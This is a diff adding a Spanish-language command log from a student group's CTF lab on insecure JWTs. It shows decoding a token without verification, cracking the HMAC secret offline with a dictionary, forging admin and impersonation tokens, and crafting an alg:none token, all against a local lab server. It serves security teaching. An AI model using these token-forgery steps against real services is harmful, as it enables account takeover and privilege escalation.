@@ -1,0 +1,63 @@
+# Bitácora de comandos — Lab Extra 5: JWT inseguro
+# Grupo 05 — Magni, Mosconi, Presuttari, Terreno
+# Todos los comandos se ejecutaron desde la raíz del repositorio.
+
+# 1. Levantar el portal en una terminal aparte (sin Docker).
+python3 labs/labextra5-jwt/objetivo/server.py
+
+# 2. Login con las credenciales de demo y captura del token.
+curl -s 'http://localhost:8080/login?user=diego&pass=diego123'
+TOKEN=$(python3 -c "import json;print(json.load(open('entregas/labextra5/grupo05/evidencia/salidas/r1_login.json'))['token'])")
+
+# 3. R1 — decodificar el token sin verificar la firma.
+python3 entregas/labextra5/grupo05/jwt_tool.py decodificar "$TOKEN"
+
+# 4. R2 — crack offline del secreto HMAC y forja de role=admin.
+python3 entregas/labextra5/grupo05/jwt_tool.py crackear "$TOKEN" labs/labextra5-jwt/caso/diccionario.txt
+ADMIN_TOKEN=$(python3 entregas/labextra5/grupo05/jwt_tool.py forjar mate123 --sub diego --role admin)
+curl -s -i -H "Authorization: Bearer $ADMIN_TOKEN" http://localhost:8080/admin
+
+# 5. R3 — forja de identidad: sub=maria con el mismo secreto.
+MARIA_TOKEN=$(python3 entregas/labextra5/grupo05/jwt_tool.py forjar mate123 --sub maria --role user)
+curl -s -i -H "Authorization: Bearer $MARIA_TOKEN" http://localhost:8080/perfil
+
+# 6. Control de sanidad (a): el token real de diego no entra a /admin.
+curl -s -i -H "Authorization: Bearer $TOKEN" http://localhost:8080/admin
+
+# 7. Control de sanidad (b): token forjado con un carácter cambiado en la firma.
+BAD_TOKEN=$(python3 - "$ADMIN_TOKEN" <<'PY'
+import sys
+partes = sys.argv[1].split('.')
+firma = partes[2]
+partes[2] = firma[:-1] + ('A' if firma[-1] != 'A' else 'B')
+print('.'.join(partes))
+PY
+)
+curl -s -i -H "Authorization: Bearer $BAD_TOKEN" http://localhost:8080/admin
+
+# 8. P4 — token con alg:none y firma vacía.
+NONE_TOKEN=$(python3 - <<'PY'
+import base64, json, time
+
+def b64(datos):
+    return base64.urlsafe_b64encode(datos).rstrip(b'=').decode()
+
+header = b64(json.dumps({"alg": "none", "typ": "JWT"}, separators=(',', ':')).encode())
+payload = b64(json.dumps({"sub": "diego", "role": "admin", "iat": int(time.time()),
+                          "exp": int(time.time()) + 3600}, separators=(',', ':')).encode())
+print(header + '.' + payload + '.')
+PY
+)
+curl -s -i -H "Authorization: Bearer $NONE_TOKEN" http://localhost:8080/admin
+
+# 9. Entrega de las tres flags y verificación del progreso.
+./ctf submit extra5 R1 'FLAG{jwt_solo_base64}'
+./ctf submit extra5 R2 'FLAG{jwt_forjado_admin}'
+./ctf submit extra5 R3 'FLAG{jwt_suplantacion_idor}'
+./ctf status extra5
+
+# Las salidas crudas de los pasos 2 a 9 quedaron en evidencia/salidas/:
+#   r1_login.json, r1_decodificado.txt, r2_crackeo.txt, r2_token_admin.txt,
+#   r2_admin_flag.txt, r3_token_maria.txt, r3_perfil_maria.txt,
+#   sanidad_admin_403.txt, sanidad_token_alterado.txt, sanidad_firma_401.txt,
+#   p4_token_alg_none.txt, p4_alg_none_401.txt y ctf_status.txt.
